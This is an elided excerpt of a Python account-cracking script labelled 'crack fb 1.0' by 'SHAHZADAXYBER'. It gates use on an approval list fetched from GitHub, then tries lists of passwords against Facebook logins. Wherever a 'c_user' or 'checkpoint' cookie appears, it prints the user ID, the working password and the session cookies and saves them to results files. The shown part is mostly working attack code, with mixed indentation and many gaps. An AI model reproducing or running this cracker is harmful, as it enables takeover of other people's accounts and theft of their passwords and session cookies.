...
│    ──────────────────────────                                              crack fb 1.0      │
└──────────────────────────────────────────────────────────────────────────────────────────────┘  	
			{m} ☯︎ {k} ☯︎ {h} ☯︎ {sir} CODER : SHAHZADAXYBER{x}{m} ☯︎ {k} ☯︎ {h} ☯︎ {x}''')
...
def chk(): 
  ...
  print ("\033[1;92m╰────────────────────────────────────────────╯")
  try: 
    httpCaht = requests.get("https://raw.githubusercontent.com/SHAHZAD-AAHME/create-public/main/Approved.txt").text 
    if id in httpCaht: 
...
def login_lagi334():
	try:
		os.system('clear')
		banner()
		cetak(nel('\t( ͠° ͟ʖ ͡°) WELCM 2 SHAHZADA TOOLS : [green]🇨 🇴 🇰 🇮  [white] (;´༎ຶٹ༎ຶ`)'))
        ...
        try:
            for pw in pasw:
                ...
                if "c_user" in session.cookies.get_dict():
                    ...
                    print('\r %sSHAHZADA CP %s               \n Username : %s\n Password : %s%s\n'%(K,waktu,user,pw,N))
                    wrt = '[SHAHZADA CP] %s • %s' % (user,pw)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                else:
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='SHAHZADA CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='SHAHZADA OK'))
					ok+=1
					break
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SHAHZADA XYBER OK[/bold green]'))
					ok+=1
					break
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					statusok = f'[bold green][•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}[/bold green]\n{infoakun}'
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]SHAHZADA OK[/bold green]'))
					ok+=1
					break
			else:
				continue
